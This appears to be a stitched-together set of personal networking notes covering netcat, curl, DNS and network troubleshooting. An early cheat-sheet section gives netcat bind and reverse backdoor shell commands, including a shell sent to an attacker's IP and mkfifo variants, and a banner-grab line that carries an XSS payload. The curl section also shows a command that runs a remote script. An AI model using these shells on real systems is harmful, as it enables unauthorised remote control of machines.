				echo "TRACE / HTTP/1.1\nHost: $range$host\nuser-agent: <script>alert(123)</script>\n\n" | nc -v -w 2 $range$host $port >> "/tmp/bannergrab"
			fi;
			if [ "$port" -eq "3306"]; then
				echo "Found open port "$range$host":"$port" Possible MySQL installation found, saving the banner for later inspection, the MySQL version can be found in this.";
				nc -v $range$host $port -w 1 >> "/tmp/bannergrab";
			fi;
		fi;
	done
done

Basic netcat backdoor shells

There is a flag "-e" in netcat, with this you can let netcat automatically listen with the specified program, it has been removed because of the security issues related to this, there has been a public exploit exploiting a buffer overflow in this since 2004 on windows and there has not been a patch.

# For *nix systems you can use this:
$ nc -l -e /bin/sh localhost 1337
# And for Windows systems you can use this:
$ nc -l -e cmd.exe cmd.exe 1337

Just another reminder, you might need the -p flag before the port, in the latest versions this is not required but the later versions also don't support the -e flag.
Once you executed this command on the computer you can simply netcat in it and you will have your shell.
You may wonder why a buffer overflow is a problem in a function which is mainly for creating a backdoor, it's because there are mail server scripts and things like that which depend on netcat.
You can also just give it another program for example this would open a port and echo anything back.

$ nc -l -e /bin/cat localhost 1337

Here you don't have supposedly a backdoor running but with the buffer overflow you could exploit it.
Anyway, let's reverse things, listening shells are way too detectable and when there is some basic port forwarding you can't get in already.
This way you will make yourself listen and netcat will connect to you and give you a shell.

# You do:
$ nc -lv 1337
# And on the machine you want to backdoor you do:
$ nc -e /bin/sh <Your IP> 1337

Be sure the remote computer can reach you over that port, when you have a home user setup you probably just have to go inside your router and port forward the port to your computer to make it work.
Better netcat backdoor shells

Since the -e flag has been removed in most versions we have to hack our way around it.
Here is a basic exmple of how to do so:

mkfifo /tmp/pipe;
sh /tmp/pipe | nc -l 1337 > /tmp/pipe

Just connect to it and you got a shell.
Here is the reversed version:

mkfifo /tmp/pipe
sh /tmp/pipe | nc localhost 1338 > /tmp/pipe

Unencrypted shell streams are very easy to sniff, we should encrypt them.

!under consruction! - blowfish encryption
#!/bin/sh
# This script is for the connecting client.

password="secret";

echo $1 > cache_cmd;
openssl enc -bf -pass pass:passwd -in cache_cmd | nc localhost 1337

#!/bin/sh
# This script is for the listening server.

password="secret";

openssl enc -bf -d -in $1 -pass pass:$password -out cache;
cat cache;

#tiny notes
openssl enc -bf -d -in pipe -pass pass:passwd | nc -l 1337 > pipe

openssl enc -bf -pass pass:passwd -in cache_cmd | nc localhost 1337
!under construction!

This cheat sheet is still under construction, I released it so friends can give feedback, if you have feedback or questions or you see errors please let me know through a comment or contact me if you know how (you can always look in the ackack IRC storm.psych0tik.net/6697 #ackack).

		9.4.2  netcat uses

I'm using two systems in this article:

    server1.example.com: IP address 192.168.0.100
    server2.example.com: IP address 192.168.0.101

netcat should already be installed on your system - you can check with

which nc

To learn more about netcat, take a look at its man page:

man nc

 
2 Copying A File From One System To The Other

Let's say we want to copy the file ISPConfig-2.2.27.tar.gz from server1 to server2. To do this, run

server2:

nc -lp 1234 > ISPConfig-2.2.27.tar.gz

on server2 (1234 is some unused port - you can replace it with another value if you like). server2 will then wait for the file ISPConfig-2.2.27.tar.gz on port 1234.

On server1, run

server1:

nc -w 1 server2.example.com 1234 < ISPConfig-2.2.27.tar.gz

to start the file transfer.

 
3 Cloning Hard Drives & Partitions

You can use netcat even to clone hard drives/partitions over the network. In this example, I want to clone /dev/sda from server1 to server2. Of course, the to-be-cloned partitions must be unmounted on the target system, so if you want to clone the system partition, you must boot the target system (server2) from a rescue system or Live-CD such as Knoppix. Please keep in mind that the target system's IP address might change under the live system (you can find out by running

ifconfig

). server2's IP address in this example is 192.168.0.12 instead of 192.168.0.101.

On server2, run

server2:

nc -l -p 1234 | dd of=/dev/sda

Afterwards, on server1, run

server1:

dd if=/dev/sda | nc 192.168.0.12 1234

to start the cloning process. This can take some time, depending on the size of the hard drive or partitions.

 
4 Port Scanning

On server1, you can scan for open ports on server2 as follows:

server1:

nc -v -w 1 server2.example.com -z 1-1000

(1-1000 means: scan ports from port number 1 to port number 1000.)

You can also scan ports on the local system:

nc -v -w 1 localhost -z 1-1000

 
5 Serving Web Pages

You can even use netcat to act as a web server:

while true; do nc -l -p 80 -q 1 < somepage.html; done

would serve the page somepage.html until you close the terminal window.

 
6 Spoofing HTTP Headers

You can use netcat to request web pages:

nc ispconfig.org 80

You can then type in headers as follows:

GET / HTTP/1.1
Host: ispconfig.org
Referrer: mypage.com
User-Agent: my-browser

As you see, this allows you to make up your own referrers and browser (User-Agent). After you've typed in your headers, press ENTER twice, and the requested page will appear (including the headers sent back by the remote server):

server2:~# nc exampple.com 80
GET / HTTP/1.1
Host: example.com
Referrer: mypage.com
User-Agent: my-browser

HTTP/1.1 200 OK
Date: Fri, 28 Nov 2008 14:11:49 GMT
Server: Apache/2.2.3 (Debian) mod_ssl/2.2.3 OpenSSL/0.9.8c
Last-Modified: Wed, 26 Nov 2008 19:34:17 GMT
ETag: "228c707-21b1-b6b7e040"
Accept-Ranges: bytes
Content-Length: 8625
Content-Type: text/html

[...]

 
7 Chatting

You can even use netcat to chat from one system to the other on the command line.

Type

server2:

nc -lp 1234

on server2. server2 will then wait until server1 connects on port 1234.

On server1, run

server1:

nc server2.example.com 1234

Now you can type in messages on either system and press ENTER, and they will appear on the other system. To close the chat, press CTRL+C on either system.

 
		9.4.3 netcat check if port is open
[root@acs-yizaq-01 ~]# nc -z localhost 8000
Connection to localhost 8000 port [tcp/irdmi] succeeded!

double check w/ netstat
[root@acs-yizaq-01 ~]# netstat -a | grep -i rdm
tcp        0      0 *:irdmi                     *:*                         LISTEN      

		9.4.4 8 Practical Linux Netcat NC Command Examples

			9.4.4.1 Netcat in a Server-Client Architecture

The netcat utility can be run in the server mode on a specified port listening for incoming connections.

$ nc -l 2389
Also, it can be used in client mode trying to connect on the port(2389) just opened

$ nc localhost 2389
Now, if we write some text at the client side, it reaches the server side. Here is the proof :

$ nc localhost 2389
HI, server
On the terminal where server is running :


 
$ nc -l 2389
HI, server
So we see that netcat utility can be used in the client server socket communication.

			9.4.4.2 Use Netcat to Transfer Files

The netcat utility can also be used to transfer files. At the client side, suppose we have a file named ‘testfile’ containing :

$ cat testfile
hello test
and at the server side we have an empty file ‘test’

Now, we run the server as :

$ nc -l 2389 > test
and run the client as :

cat testfile | nc localhost 2389
Now, when we see the ‘test’ file at the server end, we see :

$ cat test
hello test
So we see that the file data was transfered from client to server.

			9.4.4.3 Netcat Supports Timeouts

There are cases when we do not want a connection to remain open forever. In that case, through ‘-w’ switch we can specify the timeout in a connection. So after the seconds specified along with -w flag, the connection between the client and server is terminated.

Server :

nc -l 2389
Client :

$ nc -w 10 localhost 2389
The connection above would be terminated after 10 seconds.

NOTE : Do not use the -w flag with -l flag at the server side as in that case -w flag causes no effect and hence the connection remains open forever.

			9.4.4.4 Netcat Supports IPV6 Connectivity

The flag -4 or -6 specifies that netcat utility should use which type of addresses. -4 forces nc to use IPV4 address while -6 forces nc to use IPV6 address.

Server :

$ nc -4 -l 2389
Client :

$ nc -4 localhost 2389
Now, if we run the netstat command, we see :

$ netstat | grep 2389
tcp        0      0 localhost:2389          localhost:50851         ESTABLISHED
tcp        0      0 localhost:50851         localhost:2389          ESTABLISHED
The first field in the above output would contain a postfix ‘6’ in case the IPV6 addresses are being used. Since in this case it is not, so a connection between server and client is established using IPV4 addresses.

Now, If we force nc to use IPV6 addresses

Server :

$ nc -6 -l 2389
Client :

$ nc -6 localhost 2389
Now, if we run the netstat command, we see :

$ netstat | grep 2389
tcp6       0      0 localhost:2389          localhost:33234         ESTABLISHED
tcp6       0      0 localhost:33234         localhost:2389          ESTABLISHED
So now a postfix ‘6’ with ‘tcp’ shows that nc is now using IPV6 addresses.

			9.4.4.5 Disable Reading from STDIN in Netcat

This functionality can be achieved by using the flag -d. In the following example, we used this flag at the client side.

Server :

$ nc -l 2389
Client :

$ nc -d localhost 2389
Hi
The text ‘Hi’ will not be sent to the server end as using -d option the read from stdin has been disabled.

			9.4.4.6 Force Netcat Server to Stay Up

If the netcat client is connected to the server and then after sometime the client is disconnected then normally netcat server also terminates.

Server :

$ nc -l 2389
Client :

$ nc localhost 2389
^C
Server :

$ nc -l 2389
$
So, in the above example we see that as soon as the client got disconnected the server was also terminated.

This behavior can be controlled by using the -k flag at the server side to force the server to stay up even after the client has disconnected.

Server :

$ nc -k -l 2389
Client :

$ nc localhost 2389
^C
Server :

$ nc -k -l 2389
So we see that by using the -k option the server remains up even if the client got disconnected.

			9.4.4.7 Configure Netcat Client to Stay Up after EOF

Netcat client can be configured to stay up after EOF is received. In a normal scenario, if the nc client receives an EOF character then it terminates immediately but this behavior can also be controlled if the -q flag is used. This flag expects a number which depicts number of seconds to wait before client terminates (after receiving EOF)

Client should be started like :

nc  -q 5  localhost 2389
Now if the client ever receives an EOF then it will wait for 5 seconds before terminating.

			9.4.4.8 Use Netcat with UDP Protocol

By default all the sockets that nc utility creates are TCP protocols but this utility also works with UDP protocol. To enable UDP protocol the -u flag is used.

Server :

$ nc -4 -u -l 2389
Client :

$ nc -4 -u localhost 2389
Now, both the server and client are configured to use UDP protocol. This can be confirmed by the following netstat command. So we see that this connection is now using the UDP protocol.

$ netstat | grep 2389
udp        0      0 localhost:42634         localhost:2389          ESTABLISHED
		9.4.5 How To Use Netcat to Establish and Test TCP and UDP Connections on a VPS
Feb 19, 2014  Networking, System Tools
Introduction

Linux is known for having a great number of mature, useful command line utilities available out of the box in most distributions. Skilled system administrators can do much of their work using the built-in tools without having to install additional software.

In this guide, we will discuss how to use the netcat utility. Often referred to as a Swiss army knife of networking tools, this versatile command can assist you in monitoring, testing, and sending data across network connections.

We will be exploring this on an Ubuntu 12.04 VPS, but netcat should be available on almost any modern Linux distribution. Ubuntu ships with the BSD variant of netcat, and this is what we will be using in this guide. Other versions may operate differently or provide other options.

General Syntax
By default, netcat operates by initiating a TCP connection to a remote host.

The most basic syntax is:

netcat [options] host port
This will attempt to initiate a TCP to the defined host on the port number specified. This is basically functions similarly to the old Linux telnet command. Keep in mind that your connection is entirely unencrypted.

If you would like to send a UDP packet instead of initiating a TCP connection, you can use the -u option:

netcat -u host port
You can specify a range of ports by placing a dash between the first and last:

netcat host startport-endport
This is generally used with some additional flags.

On most systems, we can use either netcat or nc interchangeably. They are aliases for the same command.

			9.4.5.1 How To Use Netcat for Port Scanning
One of the most common uses for netcat is as a port scanner.

Although netcat is probably not the most sophisticated tool for the job (nmap is a better choice in most cases), it can perform simple port scans to identify open ports easily.

We do this by specifying a range of ports to scan, as we did above, along with the -z option to perform a scan instead of attempting to initiate a connection.

For instance, we can scan all ports up to 1000 by issuing this command:

netcat -z -v domain.com 1-1000
Along with the -z option, we have also specified the -v option to tell netcat to provide more verbose information.

The output will look like this:

nc: connect to domain.com port 1 (tcp) failed: Connection refused
nc: connect to domain.com port 2 (tcp) failed: Connection refused
nc: connect to domain.com port 3 (tcp) failed: Connection refused
nc: connect to domain.com port 4 (tcp) failed: Connection refused
nc: connect to domain.com port 5 (tcp) failed: Connection refused
nc: connect to domain.com port 6 (tcp) failed: Connection refused
nc: connect to domain.com port 7 (tcp) failed: Connection refused
. . .
Connection to domain.com 22 port [tcp/ssh] succeeded!
. . .
As you can see, this provides a lot of information and will tell you for each port whether a scan was successful or not.

If you are actually using a domain name, this is the form you will have to use.

However, your scan will go much faster if you know the IP address that you need. You can then use the -n flag to specify that you do not need to resolve the IP address using DNS:

netcat -z -n -v 111.111.111.111 1-1000
The messages returned are actually sent to standard error (see our I/O redirection article for more info). We can send the standard error messages to standard out, which will allow us to filter the results easier.

We will redirect standard error to standard output using the 2>&1 bash syntax. We will then filter the results with grep:

netcat -z -n -v 111.111.111.111 1-1000 2>&1 | grep succeeded

Connection to 111.111.111.111 22 port [tcp/*] succeeded!
Here, we can see that the only port open in the range of 1-1000 on the remote computer is port 22, the traditional SSH port.

			9.4.5.2 How To Communicate through Netcat
Netcat is not restricted to sending TCP and UDP packets. It also can listen on a port for connections and packets. This gives us the opportunity to connect two instances of netcat in a client-server relationship.

Which computer is the server and which is the client is only a relevant distinction during the initial configuration. After the connection is established, communication is exactly the same in both directions.

On one machine, you can tell netcat to listen to a specific port for connections. We can do this by providing the -l parameter and choosing a port:

netcat -l 4444
This will tell netcat to listen for TCP connections on port 4444. As a regular (non-root) user, you will not be able to open any ports under 1000, as a security measure.

On a second server, we can connect to the first machine on the port number we choose. We do this the same way we've been establishing connections previously:

netcat domain.com 4444
It will look as if nothing has happened. However, you can now send messages on either side of the connection and they will be seen on either end.

Type a message and press ENTER. It will appear on both the local and remote screen. This works in the opposite direction as well.

When you are finished passing messages, you can press CTRL-D to close the TCP connection.

			9.4.5.3 How To Send Files through Netcat
Building off of the previous example, we can accomplish more useful tasks.

Because we are establishing a regular TCP connection, we can transmit just about any kind of information over that connection. It is not limited to chat messages that are typed in by a user. We can use this knowledge to turn netcat into a file transfer program.

Once again, we need to choose one end of the connection to listen for connections. However, instead of printing information onto the screen, as we did in the last example, we will place all of the information straight into a file:

netcat -l 4444 > received_file
On the second computer, create a simple text file by typing:

echo "Hello, this is a file" > original_file
We can now use this file as an input for the netcat connection we will establish to the listening computer. The file will be transmitted just as if we had typed it interactively:

netcat domain.com 4444 < original_file
We can see on the computer that was awaiting a connection, that we now have a new file called "received_file" with the contents of the file we typed on the other computer:

cat received_file
Hello, this is a file
As you can see, by piping things, we can easily take advantage of this connection to transfer all kinds of things.

For instance, we can transfer the contents of an entire directory by creating an unnamed tarball on-the-fly, transferring it to the remote system, and unpacking it into the remote directory.

On the receiving end, we can anticipate a file coming over that will need to be unzipped and extracted by typing:

netcat -l 4444 | tar xzvf -
The ending dash (-) means that tar will operate on standard input, which is being piped from netcat across the network when a connection is made.

On the side with the directory contents we want to transfer, we can pack them into a tarball and then send them to the remote computer through netcat:

tar -czf - * | netcat domain.com 4444
This time, the dash in the tar command means to tar and zip the contents of the current directory (as specified by the * wildcard), and write the result to standard output.

This is then written directly to the TCP connection, which is then received at the other end and decompressed into the current directory of the remote computer.

This is just one example of transferring more complex data from one computer to another. Another common idea is to use the dd command to image a disk on one side and transfer it to a remote computer. We won't be covering this here though.

			9.4.5.4 How To Use Netcat as a Simple Web Server
We've been configuring netcat to listen for connections in order to communicate and transfer files. We can use this same concept to operate netcat as a very simple web server. This can be useful for testing pages that you are creating.

First, let's make a simple HTML file on one server:

nano index.html
Here is some simple HTML that you can use in your file:

<html>
        <head>
                <title>Test Page</title>
        </head>
        <body>
                <h1>Level 1 header</h1>
                <h2>Subheading</h2>
                <p>Normal text here</p>
        </body>
</html>
Save and close the file.

Without root privileges, you cannot serve this file on the default web port, port 80. We can choose port 8888 as a regular user.

If you just want to serve one page, one time to check how it renders, you can type something like this:

netcat -l 8888 < index.html
Now, in your browser, you can access the content by visiting:

http://server_IP:8888
netcat page served

This will serve the page, and then the netcat connection will close. If you attempt to refresh the page, it will be gone:

netcat page gone

We can have netcat serve the page indefinitely by wrapping the last command in an infinite loop, like this:

while true; do nc -l 8888 < index.html; done
This will allow it to continue to receive connections after the first connection closes.

We can stop the loop by typing CTRL-C on the server.

This allows you to see how a page renders in a browser, but it doesn't provide much more functionality. You should never use this for serving actual websites. There is no security and simple things like links do not even work correctly.

Conclusion
You should now have a pretty good idea as to what netcat can be used for. It is a versatile tool that can be useful to diagnose problems and verify that base-level functionality is working correctly with TCP/UDP connections.

Using netcat, you can communicate between different computers very easily for quick interactions. Netcat attempts to make network interactions transparent between computers by taking the complexity out of forming connections.

By Justin Ellingwood
		9.4.6 
	9.5 curl

	    9.5.1 cheat-sheet
curl cheat sheet

* XML GET
```bash
curl -H "Accept: application/xml" -H "Content-Type: application/xml" -X GET "http://hostname/resource"
```
* JSON GET
```bash
curl -i -H "Accept: application/json" -H "Content-Type: application/json" -X GET "http://hostname/resource"
```
* JSON PUT
```bash
curl -i -H 'Content-Type: application/json' -H 'Accept: application/json' -X PUT -d '{"updated_field1":"updated_value1"}' "http://hostname/resourcex"
```
* JSON POST uploading a file
```bash
curl -i -H 'Accept: application/json' -X POST -F "filename=@/file/path" -F "other_field=its_value"   "http://hostname/resource"
```
* JSON DELETE
```bash
curl -i -H 'Content-Type: application/json' -H 'Accept: application/json' -X DELETE -d '{"key1":"value1"}' "http://hostname/resource"
```
* "Debugging mode" (without actual content output):
```bash
curl -XGET -vvv http://hostname/resource > dev\null
```

### Useful arguments
* ```-k```: not check SSL certificates
* ```-L```: follow redirects
* ```-v```: get verbose output
* ```-V```: get headers at output


cURL Cheat Sheet
Curl is the swiss army knife for gathering information while troubleshooting websites. There are many ways to use curl and this guide is simply documenting the ones I often use, but can never seem to remember the specific flags.
General Usage
Test a page behind a username/password prompt:
[user@workstation01 ~]# curl --user name:password http://www.example.com
Download files from github:
[user@workstation01 ~]# curl -O https://raw.github.com/username/reponame/master/filename
Download content via curl to a specific filename:
[user@workstation01 ~]# curl -o archive.tgz https://www.example.com/file.tgz
Run a script from a remote source on server. Understand the security implications of doing this as it can be dangerous!
[user@workstation01 ~]# source <( curl -sL https://www.example.com/your_script.sh)
Website Troubleshooting
Receive output detailing the HTTP response and request headers, following all redirects, and discarding the page body:
[user@workstation01 ~]# curl -Lsvo /dev/null https://www.example.com
Test a domain hosted on the local server, bypassing DNS:
[user@workstation01 ~]# curl -sLH "host: www.example.com" localhost
Test a domain against specific IP, bypassing the need for modifying /etc/hosts:
[user@workstation01 ~]# curl -Lsvo /dev/null --resolve 'example.com:443:123.123.123.123' https://www.example.com/

or

[user@workstation01 ~]# curl -Lsvo /dev/null --header "Host: example.com" https://123.123.123.123/
Send request using a specific user-agent. Sometimes a server will have rules in place to block the default curl user-agent string. Or perhaps you need to test using a specific user-agent. You can pass specific user-agent strings by running:
[user@workstation01 ~]# curl --user-agent "USER_AGENT_STRING_HERE" www.example.com
A comprehensive listing of available user-agent strings available resides at:
http://www.useragentstring.com/pages/useragentstring.php
For example, lets say you need to test a mobile device user-agent to see if a custom redirect works:
[user@workstation01 ~]# curl -H "User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19" -IL http://www.example.com/about/contact-us

HTTP/1.1 301 Moved Permanently
Date: Tue, 17 Nov 2015 18:10:09 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips
Location: http://www.example.com/mobi/contact.php
Content-Type: text/html; charset=iso-8859-1
SSL/TLS Testing
Test to see if the site supports specific SSL/TLS protocols:
[user@workstation01 ~]# curl --sslv2 https://www.example.com
[user@workstation01 ~]# curl --sslv3 https://www.example.com
[user@workstation01 ~]# curl --tlsv1 https://www.example.com
[user@workstation01 ~]# curl --tlsv1.0 https://www.example.com
[user@workstation01 ~]# curl --tlsv1.1 https://www.example.com
[user@workstation01 ~]# curl --tlsv1.2 https://www.example.com
Performance Troubleshooting
Load times can be impacted by a number of things, such as the TLS handshake, DNS lookup time, redirects, transfers, upload/downloads, etc. The curl command shown below will break down the times for each accordingly:
[user@workstation01 ~]# curl -Lsvo /dev/null https://www.example.com/ -w "\nContent Type: %{content_type} \
\nHTTP Code: %{http_code} \
\nHTTP Connect:%{http_connect} \
\nNumber Connects: %{num_connects} \
\nNumber Redirects: %{num_redirects} \
\nRedirect URL: %{redirect_url} \
\nSize Download: %{size_download} \
\nSize Upload: %{size_upload} \
\nSSL Verify: %{ssl_verify_result} \
\nTime Handshake: %{time_appconnect} \
\nTime Connect: %{time_connect} \
\nName Lookup Time: %{time_namelookup} \
\nTime Pretransfer: %{time_pretransfer} \
\nTime Redirect: %{time_redirect} \
\nTime Start Transfer (TTFB): %{time_starttransfer} \
\nTime Total: %{time_total} \
\nEffective URL: %{url_effective}\n" 2>&1
The example output is below:
...
HTTP Code: 200 
HTTP Connect:000 
Number Connects: 2 
Number Redirects: 1 
Redirect URL:  
Size Download: 136112 
Size Upload: 0 
SSL Verify: 0 
Time Handshake: 0.689 
Time Connect: 0.556 
Name Lookup Time: 0.528 
Time Pretransfer: 0.689 
Time Redirect: 0.121 
Time Start Transfer (TTFB): 0.738 
Time Total: 0.962 
Effective URL: https://www.example.com/
Another example for quickly seeing performance is below. For simplicity purposes, first create a file with our curl options already in it:
[user@workstation01 ~]# vim site-performance.cfg
\n
      DNS lookup                          :  %{time_namelookup}\n
      Connect to server (TCP)             :  %{time_connect}\n
      Connect to server (HTTP/S)          :  %{time_appconnect}\n
      Time from start until transfer began:  %{time_pretransfer}\n
      Time for redirection (if any)       :  %{time_redirect}\n
      Total time before transfer started  :  %{time_starttransfer}\n
\n
             Total time                   :  %{time_total}\n
             Size of download (bytes)     :  %{size_download}\n
             Average d/l speed (bytes/s)  :  %{speed_download}\n
\n
Then run it:
[user@workstation01 ~]# curl -w "@site-performance.cfg" -o /dev/null -s https://www.example.com
      DNS lookup                          :  0.138664
      Connect to server (TCP)             :  0.171131
      Connect to server (HTTP/S)          :  0.268969
      Time from start until transfer began:  0.269021
      Time for redirection (if any)       :  0.000000
      Total time before transfer started  :  0.532772

             Total time                   :  0.628730
             Size of download (bytes)     :  162510
             Average d/l speed (bytes/s)  :  258473.000
If a web server is running a bunch of sites and has a high load, how can you narrow down which site is likely causing the high load condition on the server? One way would be to see which site takes the longest to load, as that may indicate a resource intensive site. See the example below:
[user@workstation01 ~]# for i in www.example1.com www.example2.com www.example3.com; do echo -n "$i "; (time curl -IL $i -XGET) 2>&1 | grep -E "real|HTTP"; echo; done

www.example1.com HTTP/1.1 200 OK
real	0m0.642s

www.example2.com HTTP/1.1 200 OK
real	0m2.234s

www.example3.com HTTP/1.1 200 OK
real	0m0.421s
So www.example2.com takes 2 seconds to load. What happens to the load times on that domain during increased traffic. The example below will send 25 requests to the domain:
[user@workstation01 ~]# for i in {1..25}; do (time curl -sIL http://www.example2.com -X GET &) 2>&1 | grep -E "real|HTTP" & done

HTTP/1.1 200 OK
real	0m11.297s
HTTP/1.1 200 OK
real	0m11.395s
HTTP/1.1 200 OK
real	0m11.906s
HTTP/1.1 200 OK
real	0m12.079s
...
HTTP/1.1 200 OK
real	0m11.297s
Determining why this is happening will involve investigation outside the scope of this article. Mainly around investigating ways to cache the site or otherwise optimizing it. However at least now we know which site doesn’t perform well under increased requests, and may be causing the high server load.


￼

￼

	    9.5.2 SAP CP

	        9.5.2.1 semantic

	            9.5.2.1.1 swagger
[i500695@C02X632CJGH6:2019-02-10 18:35:06:~/work/SAP/CF_LocAL/portal-cf-site-semantic-service:]519$ curl -X GET "http://localhost:3000/semantic/api-docs/" 
[i500695@C02X632CJGH6:2019-02-10 18:35:06:~/work/SAP/CF_LocAL/portal-cf-site-semantic-service:]519$ curl -X GET "http://localhost:3000/semantic/api-docs/" | open -f -a safari

	            9.5.2.1.2 get site 
[i500695@C02X632CJGH6:2019-02-10 18:49:47:~/work/SAP/CF_LocAL/portal-cf-site-semantic-service:]519$ curl -X GET "http://localhost:3000/semantic/entity/site?contextId=666"  


	            9.5.2.1.3
[i500695@C02X632CJGH6:2019-02-10 18:49:47:~/work/SAP/CF_LocAL/portal-cf-site-semantic-service:]519$ curl -X POST "http://localhost:3000/semantic/entity/site?contextId=666"  

https://site-manager.authentication.sap.hana.ondemand.com/login
	        9.5.2.2
	    9.5.3


	9.6 tcpdump

        9.7 
10. DNS

	10.1  DNS Troubleshooting in Linux
I will take one scenario “suppose my client is unable to resolve host-names to IP address”

Step1:Check the DNS server is configured on Client end or not

check in below file if name server is configured to proper DNS server or not
#vi /etc/resolv.conf

If the client is configured with proper DNS server follow to next step

Stpe2:Ping to DNS server ip address

#ping serveripadd

If pinging is happening proceed with the next step other wise click here to do network troubleshooting.

Step3:So pinging is happening… then there is a communication path between Server-client, so we have to check weather DNS server is running or not. Here nmap can be used to check what ports opened on server.

#nmap serveripadd

Example:

#nmap 125.22.73.23

this command will give you output what are the services running/ports opened on remote server, if DNS server is running and working fine means you can see DNS port(53) in the list of opened ports. If suppose server is not running/port blocked you can click here to troubleshoot in this way.

Step4:Now checking DNS server issue in deep

    Checking under whom the DNS server is register and its properties .

#whois example.com

    Checking what server is used to resolve and some basic info.

#nslookup www.example.com

    Checking who is resolving and what is resolving in details about DNS server.

#dig www.example.com


	10.2 Simple Network Troubleshooting
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch04_:_Simple_Network_Troubleshooting#Sources_of_Network_Slowness
Contents

    10.2.1 Introduction
        10.2.1.10.2.1 Sources of Network Slowness
        10.2.1.10.2.2 Sources of a Lack of Connectivity
        10.2.1.10.2.3 Doing Basic Cable and Link Tests
    10.2.2 Testing Your NIC
        10.2.2.10.2.1 Viewing Your Activated Interfaces
        10.2.2.10.2.2 Viewing All Interfaces
            10.2.2.10.2.2.10.2.1 DHCP Considerations
        10.2.2.10.2.3 Testing Link Status from the Command Line
            10.2.2.10.2.3.10.2.1 Link Status Output from mii-tool
            10.2.2.10.2.3.10.2.2 Link Status Output from ethtool
        10.2.2.10.2.4 Viewing NIC Errors
            10.2.2.10.2.4.10.2.1 Ifconfig Error Output
            10.2.2.10.2.4.10.2.2 ethtool Error Output
        10.2.2.10.2.5 netstat Error Output
            10.2.2.10.2.5.10.2.1 Possible Causes of Ethernet Errors
    10.2.3 How to See MAC Addresses
    10.2.4 Using ping to Test Network Connectivity
    10.2.5 Using telnet to Test Network Connectivity
        10.2.5.10.2.1 Linux telnet Troubleshooting
            10.2.5.10.2.1.10.2.1 Successful Connection
            10.2.5.10.2.1.10.2.2 Connection Refused Messages
            10.2.5.10.2.1.10.2.3 telnet Timeout or Hanging
        10.2.5.10.2.2 telnet Troubleshooting Using Windows
            10.2.5.10.2.2.10.2.1 Screen Goes Blank - Successful Connection
            10.2.5.10.2.2.10.2.2 "Connect Failed" Messages
            10.2.5.10.2.2.10.2.3 telnet Timeout or Hanging
    10.2.6 Testing Web sites with the curl and wget Utilities
        10.2.6.10.2.1 Using curl
        10.2.6.10.2.2 Using wget
    10.2.7 The netstat Command
    10.2.8 The Linux iptables Firewall
        10.2.8.10.2.1 How to Configure iptables Rules
    10.2.9 Using traceroute to Test Connectivity
        10.2.9.10.2.1 Sample traceroute Output
        10.2.9.10.2.2 Possible traceroute Messages
            10.2.9.10.2.2.10.2.1 Table 10.2.4-10.2.1: traceroute Return Code Symbols
        10.2.9.10.2.3 traceroute Time Exceeded False Alarms
        10.2.9.10.2.4 traceroute Internet Slowness False Alarm
        10.2.9.10.2.5 traceroute Dies At The Router Just Before The Server
        10.2.9.10.2.6 Always Get a Bidirectional traceroute
        10.2.9.10.2.7 ping and traceroute Troubleshooting Example
        10.2.9.10.2.8 traceroute Web sites
        10.2.9.10.2.9 Possible Reasons For Failed Traceroutes
    10.2.10 Using MTR To Detect Network Congestion
    10.2.11 Viewing Packet Flows with tcpdump
        10.2.11.10.2.1 Table 10.2.4-10.2.2 : Possible TCPdump Switches
        10.2.11.10.2.2 Table 10.2.4-10.2.3 : Useful tcpdump Expressions
        10.2.11.10.2.3 Analyzing tcpdump files
        10.2.11.10.2.4 Common Problems with tcpdump
    10.2.12 Viewing Packet Flows with tshark
        10.2.12.10.2.1 Table 10.2.4-10.2.4 : Possible tshark Switches
        10.2.12.10.2.2 Table 10.2.4-10.2.5 : Useful tshark Expressions
    10.2.13 Basic DNS Troubleshooting
        10.2.13.10.2.1 Using nslookup to Test DNS
            10.2.13.10.2.1.10.2.1 Using nslookup to Check Your Web site Name
            10.2.13.10.2.1.10.2.2 Using nslookup To Check Your IP Address
            10.2.13.10.2.1.10.2.3 Using nslookup to Query a Specific DNS Server
        10.2.13.10.2.2 Using the host Command to Test DNS
    10.2.14 Using nmap
        10.2.14.10.2.1 Table 10.2.4-10.2.6 Commonly Used NMAP Options
    10.2.15 Using netcat to Test Network Bandwidth
    10.2.16 Determining the Source of an Attack
    10.2.17 Who Has Used My System?
        10.2.17.10.2.1 The last Command
        10.2.17.10.2.2 The who Command
    10.2.18 Conclusion

	10.2.18.1 Introduction

You will eventually find yourself trying to fix a network related problem which usually appears in one of two forms. The first is slow response times from the remote server, and the second is a complete lack of connectivity. These symptoms can be caused by:
Sources of Network Slowness

    NIC duplex and speed incompatibilities
    Network congestion
    Poor routing
    Bad cabling
    Electrical interference
    An overloaded server at the remote end of the connection
    Misconfigured DNS (Covered in Chapter 18, "Configuring DNS" and Chapter 19, "Dynamic DNS") 

Sources of a Lack of Connectivity

All sources of slowness can become so severe that connectivity is lost. Additional sources of disconnections are:

    Power failures
    The remote server or an application on the remote server being shut down. 

We discuss how to isolate these problems and more in the following sections.
Doing Basic Cable and Link Tests

Your server won't be able to communicate with any other device on your network unless the NIC's "link" light is on. This indicates that the connection between your server and the switch/router is functioning correctly.

In most cases a lack of link is due to the wrong cable type being used. As described in Chapter 2, "Introduction to Networking", there are two types of Ethernet cables crossover and straight-through. Always make sure you are using the correct type.

Other sources of link failure include:

    The cables are bad.
    The switch or router to which the server is connected is powered down.
    The cables aren't plugged in properly. 

If you have an extensive network, investment in a battery-operated cable tester for basic connectivity testing is invaluable. More sophisticated models in the market will be able to tell you the approximate location of a cable break and whether an Ethernet cable is too long to be used.

	10.2.18.2 Testing Your NIC

It is always a good practice in troubleshooting to be versed in monitoring the status of your NIC card from the command line. The following sections introduce a few commands that will be useful.


Viewing Your Activated Interfaces

The ifconfig command without any arguments gives you all the active interfaces on your system. Interfaces will not appear if they are shut down:

[root@bigboy tmp]# ifconfig

Note: Interfaces will appear if they are activated, but have no link. We'll soon discuss how to determine the link status using commands.
Viewing All Interfaces

The ifconfig -a command provides all the network interfaces, whether they are functional or not. Interfaces that are shut down by the systems administrator or are nonfunctional will not show an IP address line and the word UP will not show in the second line of the output. This can be seen in the next examples:

    Shut Down Interface 

wlan0   Link encap:Ethernet  HWaddr 00:06:25:09:6A:D7
